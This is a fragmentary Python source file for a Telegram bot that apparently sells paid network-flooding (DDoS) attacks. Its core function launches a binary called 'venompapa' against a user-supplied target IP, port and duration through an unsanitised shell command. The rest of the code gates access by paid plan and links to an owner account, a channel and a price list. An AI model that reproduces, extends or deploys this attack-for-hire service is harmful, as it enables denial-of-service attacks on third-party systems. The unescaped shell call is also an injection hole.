...
def create_inline_keyboard():
    ...
    button3 = types.InlineKeyboardButton(
        text="🔥 𝗝𝗼𝗶𝗻 𝗢𝘂𝗿 𝗖𝗵𝗮𝗻𝗻𝗲𝗹 🔥", url="https://t.me/+CMPPSEhMaVI0OWM1")
    button1 = types.InlineKeyboardButton(text="👤 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 👤",
        url="https://t.me/+CMPPSEhMaVI0OWM1")
    markup.add(button3)
    markup.add(button1)
    return markup
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./venompapa {target_ip} {target_port} {duration} 150")
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Contact the owner for assistance: @BABBY_HACK2.*", 
                                       reply_markup=create_inline_keyboard(), parse_mode='Markdown')
            return
    ...
    try:
        ...
        if not user_data:
            ...
            button2 = types.InlineKeyboardButton(
                text="💸 𝗣𝗿𝗶𝗰𝗲 𝗟𝗶𝘀𝘁 💸", url="https://t.me/+CMPPSEhMaVI0OWM1")
            markup.add(button1)
            markup.add(button2)
        else:
